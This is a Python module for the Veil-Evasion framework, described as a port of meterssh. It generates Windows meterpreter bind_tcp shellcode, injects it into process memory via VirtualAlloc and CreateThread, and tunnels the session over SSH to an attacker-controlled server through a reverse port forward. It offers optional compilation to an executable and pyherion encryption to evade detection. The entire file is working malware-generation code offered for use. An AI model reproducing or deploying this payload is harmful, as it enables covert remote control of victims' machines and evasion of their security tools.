""""
Basically a port of https://github.com/trustedsec/meterssh for Veil-Evasion

Injects windows/meterpreter/bind_tcp into memory then tunnels meterpreter over ssh
back to the attackers machine

Module by @byt3bl33d3r
"""

from modules.common import helpers
from modules.common import shellcode
from modules.common import encryption

import settings

class Payload:
	
	def __init__(self):
		# required options
		self.description = "Tunnels windows/meterpreter/bind_tcp over ssh"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"

		self.shellcode = shellcode.Shellcode()
		
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
								 "use_pyherion"   : ["N", "Use the pyherion encrypter"],
								 "SSHUSER"        : ["", "User for ssh"],
								 "SSHPASS"        : ["", "Password for ssh"],
								 "SSHOST"         : ["", "IP of your ssh server"],
								 "SSHPORT"        : ["22", "Port of your SSH server"],
								 "LPORT"          : ["8021", "Port to bind and forward on remote host"]}

	def generate(self):

		self.shellcode.SetPayload(["windows/meterpreter/bind_tcp", ["LHOST=127.0.0.1", 
																	"LPORT=" + self.required_options["LPORT"][0]]])

		Shellcode = self.shellcode.generate()

		PayloadCode = """from socket import *
import paramiko
import multiprocessing
import time
import subprocess
import ctypes
import thread
import threading
import select

def inject(shellcode):
	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
											  ctypes.c_int(len(shellcode)),
											  ctypes.c_int(0x3000),
											  ctypes.c_int(0x40))
	ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
									   ctypes.c_int(len(shellcode)))
	buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
										 buf,
										 ctypes.c_int(len(shellcode)))
	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
											 ctypes.c_int(0),
											 ctypes.c_int(ptr),
											 ctypes.c_int(0),
											 ctypes.c_int(0),
											 ctypes.pointer(ctypes.c_int(0)))
	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

def handler(chan, host, port):
	sock = socket()
	try:
		sock.connect((host, port))
	except Exception:
		pass
  
	while True:
		r, w, x = select.select([sock, chan], [], [])
		if sock in r:
			data = sock.recv(1024)
			if len(data) == 0:
				break
			chan.send(data)
		if chan in r:
			data = chan.recv(1024)
			if len(data) == 0:
				break
			sock.send(data)
	chan.close()
	sock.close()

def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):

		transport.request_port_forward('', server_port)
		while True:
				chan = transport.accept(1000)
				if chan is None:
						continue

				thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))
				thr.setDaemon(True)
				thr.start()

def main(user,password, rhost, port, shellport):
	server = [rhost, int(port)]  
	remote = ['127.0.0.1', int(shellport)] 
	client = paramiko.SSHClient() 
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		client.connect(server[0], server[1], username=user, key_filename=None, look_for_keys=False, password=password)
	except Exception:
		pass

	try:
		reverse_forward_tunnel(int(shellport), remote[0], remote[1], client.get_transport())
	except Exception:
		pass

if __name__ == '__main__':
	multiprocessing.freeze_support()
	shellcode = r"%s"
	shellcode = shellcode.decode("string_escape")
	shellcode = bytearray(shellcode)
	shellport = "%s"
	time.sleep(2)
	p = multiprocessing.Process(target=inject, args=(shellcode,))
	jobs = []
	jobs.append(p)
	p.start()
	user = "%s"
	password = "%s"
	rhost = "%s"
	port = "%s"
	time.sleep(3)
	thread.start_new_thread(main,(user, password, rhost, port, shellport))""" % (Shellcode,
																				 self.required_options["LPORT"][0],
																				 self.required_options["SSHUSER"][0],
																				 self.required_options["SSHPASS"][0],
																				 self.required_options["SSHOST"][0],
																				 self.required_options["SSHPORT"][0])
		if self.required_options["use_pyherion"][0].lower() == "y":
			PayloadCode = encryption.pyherion(PayloadCode)

		return PayloadCode
